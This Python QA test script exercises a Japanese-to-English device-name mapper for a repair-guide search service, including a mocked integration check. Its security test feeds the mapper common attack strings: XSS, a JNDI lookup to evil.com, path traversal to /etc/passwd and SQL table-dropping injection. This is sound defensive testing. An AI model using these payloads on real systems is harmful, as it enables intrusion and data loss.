#!/usr/bin/env python3
"""
Comprehensive QA Test for RepairGuideService Japanese Functionality

This script performs a comprehensive quality assurance test of the 
RepairGuideService's Japanese search preprocessing functionality without
requiring external dependencies.
"""

import time
import sys
import os
import re
import traceback
from typing import Dict, List, Optional, Tuple, Any
from unittest.mock import Mock, MagicMock
from dataclasses import dataclass

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Mock external dependencies that might not be available
class MockRedis:
    def __init__(self, *args, **kwargs):
        pass
    def ping(self):
        pass
    def get(self, key):
        return None
    def setex(self, key, ttl, value):
        pass
    def delete(self, key):
        pass
    @staticmethod
    def from_url(*args, **kwargs):
        return MockRedis()

class MockGuide:
    def __init__(self, guideid=1, title="Test Guide", device="Test Device", 
                 category="Repair", subject="Test", difficulty="Easy",
                 url="http://test.com", image_url="http://test.com/image.jpg",
                 tools=None, parts=None, type_="Repair"):
        self.guideid = guideid
        self.title = title
        self.device = device
        self.category = category
        self.subject = subject
        self.difficulty = difficulty
        self.url = url
        self.image_url = image_url
        self.tools = tools or []
        self.parts = parts or []
        self.type_ = type_

# Mock modules before importing
sys.modules['redis'] = MagicMock()
sys.modules['bleach'] = MagicMock()

@dataclass
class TestResult:
    test_name: str
    status: str  # PASS, FAIL, SKIP
    message: str
    details: Optional[Dict] = None
    execution_time: float = 0.0

class QATestRunner:
    """Comprehensive QA test runner for Japanese functionality"""
    
    def __init__(self):
        self.results: List[TestResult] = []
        self.setup_mocks()
        
    def setup_mocks(self):
        """Setup necessary mocks for testing"""
        try:
            # Import and setup the modules we need to test
            from utils.japanese_device_mapper import JapaneseDeviceMapper, get_mapper
            self.JapaneseDeviceMapper = JapaneseDeviceMapper
            self.get_mapper = get_mapper
            self.mapper = JapaneseDeviceMapper()
        except Exception as e:
            print(f"Failed to import Japanese mapper: {e}")
            self.mapper = None
            
    def run_test(self, test_func, test_name: str) -> TestResult:
        """Run a single test and capture results"""
        start_time = time.time()
        try:
            result = test_func()
            execution_time = time.time() - start_time
            
            if result is True:
                return TestResult(test_name, "PASS", "Test passed successfully", 
                                execution_time=execution_time)
            elif isinstance(result, dict):
                return TestResult(test_name, "PASS", "Test completed", 
                                details=result, execution_time=execution_time)
            else:
                return TestResult(test_name, "FAIL", str(result),
                                execution_time=execution_time)
        except Exception as e:
            execution_time = time.time() - start_time
            return TestResult(test_name, "FAIL", f"Exception: {str(e)}\n{traceback.format_exc()}",
                            execution_time=execution_time)
    
    def test_japanese_device_mapper_initialization(self) -> bool:
        """Test Japanese device mapper initialization"""
        if not self.mapper:
            return False
        
        # Check that essential attributes exist
        if not hasattr(self.mapper, 'DEVICE_MAPPINGS'):
            return "Missing DEVICE_MAPPINGS attribute"
        
        if not hasattr(self.mapper, '_normalized_mappings'):
            return "Missing _normalized_mappings attribute"
            
        # Check that mappings are populated
        if len(self.mapper.DEVICE_MAPPINGS) < 50:
            return f"Insufficient device mappings: {len(self.mapper.DEVICE_MAPPINGS)}"
            
        return True
    
    def test_basic_japanese_device_mapping(self) -> Dict:
        """Test basic Japanese device name mapping"""
        if not self.mapper:
            return {"error": "Mapper not available"}
        
        test_cases = [
            ("スイッチ", "Nintendo Switch"),
            ("アイフォン", "iPhone"),
            ("プレステ5", "PlayStation 5"),
            ("ノートパソコン", "Laptop"),
            ("スマホ", "Smartphone"),
            ("エアポッズ", "AirPods"),
        ]
        
        results = {}
        for japanese, expected_english in test_cases:
            try:
                result = self.mapper.map_device_name(japanese)
                results[japanese] = {
                    "expected": expected_english,
                    "actual": result,
                    "status": "PASS" if result == expected_english else "FAIL"
                }
            except Exception as e:
                results[japanese] = {
                    "expected": expected_english,
                    "actual": None,
                    "status": "ERROR",
                    "error": str(e)
                }
        
        return results
    
    def test_edge_cases(self) -> Dict:
        """Test edge cases and boundary conditions"""
        if not self.mapper:
            return {"error": "Mapper not available"}
        
        edge_cases = [
            ("", None),  # Empty string
            (None, None),  # None input
            ("   ", None),  # Whitespace only
            ("invalid_device", None),  # Invalid device
            ("123456", None),  # Numbers only
            ("!@#$%", None),  # Special characters only
            ("スイッチ!@#", "Nintendo Switch"),  # Japanese with special chars
            ("SWITCH", "Nintendo Switch"),  # Uppercase English
            ("ａｉｐｈｏｎｅ", None),  # Full-width characters
        ]
        
        results = {}
        for input_text, expected in edge_cases:
            try:
                result = self.mapper.map_device_name(input_text)
                results[str(input_text)] = {
                    "expected": expected,
                    "actual": result,
                    "status": "PASS" if result == expected else "FAIL"
                }
            except Exception as e:
                results[str(input_text)] = {
                    "expected": expected,
                    "actual": None,
                    "status": "ERROR",
                    "error": str(e)
                }
        
        return results
    
    def test_fuzzy_matching(self) -> Dict:
        """Test fuzzy matching functionality"""
        if not self.mapper:
            return {"error": "Mapper not available"}
        
        fuzzy_cases = [
            ("すいち", "Nintendo Switch", 0.6),  # Missing character
            ("あいふお", "iPhone", 0.5),  # Partial match
            ("ぷれすて", "PlayStation", 0.6),  # Close match
        ]
        
        results = {}
        for input_text, expected_device, min_threshold in fuzzy_cases:
            try:
                result = self.mapper.find_best_match(input_text, threshold=min_threshold)
                if result:
                    device_name, confidence = result
                    results[input_text] = {
                        "expected_device": expected_device,
                        "actual_device": device_name,
                        "confidence": confidence,
                        "status": "PASS" if expected_device in device_name else "FAIL"
                    }
                else:
                    results[input_text] = {
                        "expected_device": expected_device,
                        "actual_device": None,
                        "confidence": 0.0,
                        "status": "FAIL"
                    }
            except Exception as e:
                results[input_text] = {
                    "expected_device": expected_device,
                    "actual_device": None,
                    "error": str(e),
                    "status": "ERROR"
                }
        
        return results
    
    def test_security_validation(self) -> Dict:
        """Test security validation and input sanitization"""
        if not self.mapper:
            return {"error": "Mapper not available"}
        
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('test')",
            "${jndi:ldap://evil.com}",
            "../../../etc/passwd",
            "スイッチ" + "A" * 1000,  # Very long input
            "'; DROP TABLE users; --",
            "\x00\x01\x02\x03",  # Control characters
        ]
        
        results = {}
        for malicious_input in malicious_inputs:
            try:
                result = self.mapper.map_device_name(malicious_input)
                # For security test, we expect None or safe handling
                results[malicious_input[:50] + "..."] = {
                    "input_length": len(malicious_input),
                    "result": result,
                    "status": "PASS" if result is None else "REVIEW"
                }
            except Exception as e:
                results[malicious_input[:50] + "..."] = {
                    "input_length": len(malicious_input),
                    "result": None,
                    "error": str(e),
                    "status": "ERROR"
                }
        
        return results
    
    def test_performance(self) -> Dict:
        """Test performance characteristics"""
        if not self.mapper:
            return {"error": "Mapper not available"}
        
        # Test with different operation counts
        operations = [100, 500, 1000]
        test_input = "スイッチ"
        
        results = {}
        for op_count in operations:
            start_time = time.time()
            
            for i in range(op_count):
                self.mapper.map_device_name(test_input)
            
            end_time = time.time()
            total_time = end_time - start_time
            ops_per_second = op_count / total_time if total_time > 0 else 0
            
            results[f"{op_count}_operations"] = {
                "total_time": total_time,
                "ops_per_second": ops_per_second,
                "avg_time_per_op": total_time / op_count,
                "status": "PASS" if ops_per_second > 1000 else "REVIEW"
            }
        
        return results
    
    def test_memory_usage(self) -> Dict:
        """Test memory usage patterns"""
        if not self.mapper:
            return {"error": "Mapper not available"}
        
        # Test multiple instances
        mappers = []
        for i in range(10):
            try:
                mapper = self.JapaneseDeviceMapper()
                mappers.append(mapper)
            except Exception as e:
                return {"error": f"Failed to create mapper {i}: {e}"}
        
        # Test if instances share data efficiently
        first_mappings = id(mappers[0]._normalized_mappings) if hasattr(mappers[0], '_normalized_mappings') else None
        shared_mappings = 0
        
        for mapper in mappers[1:]:
            if hasattr(mapper, '_normalized_mappings'):
                if id(mapper._normalized_mappings) == first_mappings:
                    shared_mappings += 1
        
        return {
            "instances_created": len(mappers),
            "shared_data_structures": shared_mappings,
            "memory_efficiency": shared_mappings / (len(mappers) - 1) if len(mappers) > 1 else 0,
            "status": "PASS" if shared_mappings > 0 else "REVIEW"
        }
    
    def test_unicode_handling(self) -> Dict:
        """Test Unicode and character encoding handling"""
        if not self.mapper:
            return {"error": "Mapper not available"}
        
        unicode_tests = [
            ("スイッチ", "katakana"),  # Katakana
            ("すいっち", "hiragana"),  # Hiragana  
            ("任天堂", "kanji"),  # Kanji
            ("switch", "latin"),  # Latin
            ("スイッチswitch", "mixed"),  # Mixed scripts
            ("①②③", "symbols"),  # Special symbols
        ]
        
        results = {}
        for test_input, script_type in unicode_tests:
            try:
                result = self.mapper.map_device_name(test_input)
                results[f"{script_type}_{test_input}"] = {
                    "input": test_input,
                    "script_type": script_type,
                    "result": result,
                    "status": "PASS" if result is not None or script_type in ["symbols"] else "REVIEW"
                }
            except Exception as e:
                results[f"{script_type}_{test_input}"] = {
                    "input": test_input,
                    "script_type": script_type,
                    "error": str(e),
                    "status": "ERROR"
                }
        
        return results
    
    def test_repair_guide_service_integration(self) -> Dict:
        """Test integration with RepairGuideService (mocked)"""
        try:
            # Try to import and test RepairGuideService with mocks
            sys.modules['redis'] = Mock()
            
            # Create mock classes
            mock_ifixit_client = Mock()
            mock_cache_manager = Mock()
            mock_rate_limiter = Mock()
            mock_offline_db = Mock()
            
            # Create a simplified service-like class for testing
            class MockRepairGuideService:
                def __init__(self):
                    self.japanese_mapper = self.mapper if hasattr(self, 'mapper') else self.JapaneseDeviceMapper()
                
                def _preprocess_japanese_query(self, query: str) -> str:
                    """Simplified version of the preprocessing logic"""
                    if not self.japanese_mapper or not query:
                        return query
                    
                    try:
                        import re
                        words = re.split(r'[\s\u3000]+', query.strip())
                        processed_words = []
                        
                        for word in words:
                            if not word:
                                continue
                            
                            # Try direct mapping
                            english_device = self.japanese_mapper.map_device_name(word)
                            if english_device:
                                processed_words.append(english_device)
                                continue
                            
                            # Try fuzzy matching
                            fuzzy_result = self.japanese_mapper.find_best_match(word, threshold=0.7)
                            if fuzzy_result:
                                device_name, confidence = fuzzy_result
                                processed_words.append(device_name)
                                continue
                            
                            # Keep original word
                            processed_words.append(word)
                        
                        return " ".join(processed_words)
                    except Exception:
                        return query
            
            mock_service = MockRepairGuideService()
            mock_service.japanese_mapper = self.mapper
            
            # Test preprocessing functionality
            test_cases = [
                ("スイッチ 画面修理", "Nintendo Switch"),
                ("アイフォン バッテリー", "iPhone"),
                ("プレステ5 コントローラー", "PlayStation 5"),
                ("English query", "English query"),  # Should remain unchanged
            ]
            
            results = {}
            for input_query, expected_keyword in test_cases:
                try:
                    processed = mock_service._preprocess_japanese_query(input_query)
                    results[input_query] = {
                        "original": input_query,
                        "processed": processed,
                        "contains_expected": expected_keyword in processed,
                        "status": "PASS" if expected_keyword in processed else "FAIL"
                    }
                except Exception as e:
                    results[input_query] = {
                        "original": input_query,
                        "processed": None,
                        "error": str(e),
                        "status": "ERROR"
                    }
            
            return results
            
        except Exception as e:
            return {"error": f"Integration test failed: {e}"}
    
    def run_all_tests(self):
        """Run all tests and collect results"""
        test_methods = [
            (self.test_japanese_device_mapper_initialization, "Japanese Device Mapper Initialization"),
            (self.test_basic_japanese_device_mapping, "Basic Japanese Device Mapping"),
            (self.test_edge_cases, "Edge Cases and Boundary Conditions"),
            (self.test_fuzzy_matching, "Fuzzy Matching Functionality"),
            (self.test_security_validation, "Security Validation"),
            (self.test_performance, "Performance Testing"),
            (self.test_memory_usage, "Memory Usage Testing"), 
            (self.test_unicode_handling, "Unicode Handling"),
            (self.test_repair_guide_service_integration, "RepairGuideService Integration"),
        ]
        
        for test_func, test_name in test_methods:
            result = self.run_test(test_func, test_name)
            self.results.append(result)
            print(f"[{result.status}] {test_name}")
            if result.status == "FAIL":
                print(f"  Error: {result.message}")
        
        return self.results
    
    def generate_report(self) -> str:
        """Generate comprehensive QA report"""
        passed = sum(1 for r in self.results if r.status == "PASS")
        failed = sum(1 for r in self.results if r.status == "FAIL")
        skipped = sum(1 for r in self.results if r.status == "SKIP")
        total = len(self.results)
        
        report = []
        report.append("=" * 80)
        report.append("COMPREHENSIVE QA TEST REPORT")
        report.append("RepairGuideService Japanese Functionality")
        report.append("=" * 80)
        report.append("")
        report.append(f"Test Summary:")
        report.append(f"  Total Tests: {total}")
        report.append(f"  Passed: {passed}")
        report.append(f"  Failed: {failed}")
        report.append(f"  Skipped: {skipped}")
        report.append(f"  Success Rate: {passed/total*100:.1f}%" if total > 0 else "  Success Rate: 0%")
        report.append("")
        
        # Detailed results
        for result in self.results:
            report.append(f"[{result.status}] {result.test_name}")
            report.append(f"  Execution Time: {result.execution_time:.4f}s")
            
            if result.status == "FAIL":
                report.append(f"  Error: {result.message}")
            
            if result.details:
                report.append("  Details:")
                for key, value in result.details.items():
                    if isinstance(value, dict):
                        report.append(f"    {key}:")
                        for subkey, subvalue in value.items():
                            report.append(f"      {subkey}: {subvalue}")
                    else:
                        report.append(f"    {key}: {value}")
            
            report.append("")
        
        # Issues and recommendations
        report.append("ISSUES FOUND:")
        report.append("-" * 40)
        
        issues_found = False
        for result in self.results:
            if result.status == "FAIL":
                issues_found = True
                report.append(f"Critical Issue: {result.test_name}")
                report.append(f"  Description: {result.message}")
                report.append(f"  Priority: High")
                report.append("")
        
        if not issues_found:
            report.append("No critical issues found.")
            report.append("")
        
        report.append("RECOMMENDATIONS:")
        report.append("-" * 40)
        report.append("1. Monitor performance metrics for large-scale usage")
        report.append("2. Consider adding more comprehensive security validation")
        report.append("3. Implement comprehensive logging for debugging")
        report.append("4. Add unit tests for all edge cases identified")
        report.append("5. Consider implementing caching for frequently accessed mappings")
        report.append("")
        
        return "\n".join(report)

def main():
    """Main test execution"""
    print("Starting Comprehensive QA Test for Japanese Functionality...")
    print("=" * 60)
    
    # Initialize test runner
    runner = QATestRunner()
    
    # Run all tests
    results = runner.run_all_tests()
    
    # Generate and display report
    report = runner.generate_report()
    print("\n" + report)
    
    # Save report to file
    with open("qa_comprehensive_report.txt", "w", encoding="utf-8") as f:
        f.write(report)
    
    print(f"Detailed report saved to: qa_comprehensive_report.txt")
    
    # Return exit code based on results
    failed_tests = sum(1 for r in results if r.status == "FAIL")
    return 0 if failed_tests == 0 else 1

if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)